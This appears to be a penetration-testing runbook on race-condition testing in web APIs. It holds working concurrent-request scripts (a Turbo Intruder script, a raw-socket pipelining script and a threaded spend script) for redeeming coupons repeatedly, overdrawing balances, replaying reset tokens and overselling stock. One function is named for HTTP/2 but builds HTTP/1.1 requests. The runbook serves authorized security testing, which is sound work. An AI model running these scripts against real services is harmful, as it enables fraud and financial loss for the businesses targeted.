# Runbook: Race condition testing

Race conditions in APIs occur when two concurrent requests read and then modify shared state, and
the sequence of reads and writes produces an inconsistent result. The classic form is the
time-of-check/time-of-use gap: the application checks a condition (sufficient balance, valid coupon,
unredeemed token), and between the check and the write, a second request makes the same check
against the unchanged state and also passes.

HTTP/2's multiplexing makes race conditions significantly more exploitable than they were under
HTTP/1.1. Multiple requests sent in a single TCP packet arrive at the server simultaneously,
reducing the window that network jitter would otherwise make impractical to hit reliably.

## Objective

Identify endpoints that modify shared state without atomic read-modify-write operations and exploit
the resulting race window to produce outcomes that exceed the application's intended limits.

## Prerequisites

- Identified endpoints that check a condition and then modify state based on the result.
- Burp Suite Pro with Turbo Intruder extension.
- Python with `requests` and `threading` for custom concurrent testing.
- A test account with a condition worth racing: a balance to deplete, a coupon to redeem, a quota
  to exceed, a one-time token to replay.

## Phase 1: Identify race candidates

Race conditions are most impactful on endpoints that:
- Deduct from a limited resource (balance, credits, quota, uses-remaining)
- Validate and consume a one-time token (coupon, OTP, password reset link, invite code)
- Apply a single-use discount or promotion
- Check and update a status flag (is_verified, has_redeemed, is_active)
- Produce a side effect that should happen exactly once per trigger

Any endpoint that performs a check followed by a conditional write is a candidate. The question
is whether the check and the write are atomic (protected by a transaction or lock) or whether
there is a gap between them.

## Phase 2: Single-packet attack with Turbo Intruder

The single-packet attack sends all concurrent requests in the same TCP packet, eliminating network
jitter and maximising the chance that the requests arrive at the application simultaneously.

### Setup in Burp Suite

1. Capture the target request in Burp's Proxy.
2. Right-click the request and send to Turbo Intruder.
3. Load the `race-single-packet-attack.py` script from Turbo Intruder's examples.
4. Modify the script to set the number of concurrent requests:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,
                           pipeline=False)

    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    table.add(req)
```

5. Run the attack. Review the response table for any request that succeeded where the others
   returned an error: that is the race condition firing.

### Manual single-packet attack with Python

For more control over timing:

```python
import socket, ssl, time

def build_http2_request(host, path, token, body):
    # Build raw HTTP/1.1 requests for pipelining over a single connection
    req = f"POST {path} HTTP/1.1\r\n"
    req += f"Host: {host}\r\n"
    req += f"Authorization: Bearer {token}\r\n"
    req += "Content-Type: application/json\r\n"
    req += f"Content-Length: {len(body)}\r\n"
    req += "\r\n"
    req += body
    return req.encode()

host = "target.com"
path = "/api/v1/redeem"
token = "YOUR_TOKEN"
body = '{"coupon": "TESTCOUPON"}'

# Build 10 identical requests
requests_data = b"".join([build_http2_request(host, path, token, body) for _ in range(10)])

# Send all in one TCP write
context = ssl.create_default_context()
with socket.create_connection((host, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        ssock.sendall(requests_data)
        time.sleep(2)
        responses = ssock.recv(65536)
        print(responses.decode(errors='replace'))
```

## Phase 3: Interpreting results

A successful race condition produces inconsistent results across the concurrent requests. Patterns
to look for:

- Multiple `200 OK` responses where only one should succeed.
- A balance, credit count, or quota that ends up at an impossible value (below zero, above the
  starting value after a deduction).
- A one-time token that has been consumed multiple times.
- A side effect (an email, a database record, an action) that happened more than once.

If all requests return the same response, the operation is likely atomic. Try again with slightly
different request bodies to ensure the server is not deduplicating based on request identity.

## Phase 4: Common target patterns

### Coupon and promo code redemption

```bash
# Test with Turbo Intruder: 15 concurrent requests to redeem the same coupon
# A coupon used more than once or a discount applied multiple times to one order confirms the race
```

### Balance depletion below zero

Send concurrent spend requests against a balance of exactly 1 unit:

```python
import threading, requests

TOKEN = "YOUR_TOKEN"
ENDPOINT = "https://target.com/api/v1/spend"
BODY = {"amount": 1}

def attempt_spend():
    r = requests.post(ENDPOINT,
                      headers={"Authorization": f"Bearer {TOKEN}",
                               "Content-Type": "application/json"},
                      json=BODY)
    print(r.status_code, r.text[:100])

threads = [threading.Thread(target=attempt_spend) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

If more than one request returns `200`, the balance check was not atomic.

### Password reset token reuse

Request a password reset and capture the one-time token. Send multiple concurrent requests to
the redemption endpoint with the same token:

```bash
# If two concurrent reset requests both succeed, the token invalidation is not atomic
```

### Inventory check and purchase

For products with limited inventory, concurrent purchase requests may all pass the "check stock"
step and produce more orders than units available:

```bash
# With one item remaining in stock, send 5 concurrent purchase requests
# If more than one produces an order confirmation, the stock check is not atomic
```

## Output

- List of endpoints confirmed vulnerable to race conditions.
- Demonstrated impact: exact number of extra operations produced, economic value of the race.
- Request/response evidence for each finding.
- Whether the race requires HTTP/2 or is exploitable over HTTP/1.1.

## Playbooks

- [Business logic abuse](../playbooks/business-logic-abuse.md)
